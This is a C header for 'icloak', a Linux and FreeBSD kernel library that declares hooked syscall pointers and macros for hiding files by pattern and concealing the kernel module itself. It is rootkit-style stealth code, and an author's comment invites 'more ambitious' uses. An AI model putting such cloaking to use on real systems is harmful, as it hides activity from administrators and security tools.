/*
 *                                Copyright (C) 2017 by Rafael Santiago
 *
 * This is a free software. You can redistribute it and/or modify under
 * the terms of the GNU General Public License version 2.
 *
 */
#ifndef ICLOAK_H
#define ICLOAK_H 1

// TIP(Rafael): If you have more ambitious intentions maybe these following function pointers can be a little window to
//              start solving your problems. ;)

#if defined(__linux__)
# include <linux/incantations.h>
# include <linux/native_utils.h>
  extern asmlinkage long (*getdents64_syscall)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
  extern asmlinkage long (*stat64_syscall)(const char __user *filename, struct stat64 __user *statbuf);
  extern asmlinkage long (*lstat64_syscall)(const char __user *filename, struct stat64 __user *statbuf);
# elif defined(__FreeBSD__)
# include <freebsd/incantations.h>
  extern int (*fstatat_syscall)(struct thread *td, struct fstatat_args *uap);
  extern int (*getdirentries_syscall)(struct thread *td, struct getdirentries_args *uap);
# else
# error "Not supported platform."
# endif

#include <utils/memory.h>
#include <utils/icloak_ctx.h>
#include <utils/strglob.h>

#define icloak_ko(name) native_icloak_ko(name)

#define icloak_mk_ko_perm(name, exit) native_icloak_mk_ko_perm(name, exit)

#define icloak_mk_ko_nonperm(name, exit) native_icloak_mk_ko_nonperm(name, exit)

#define icloak_hide_file(pattern) native_hide_file(pattern)

#define icloak_show_file(pattern) native_show_file(pattern)

#endif
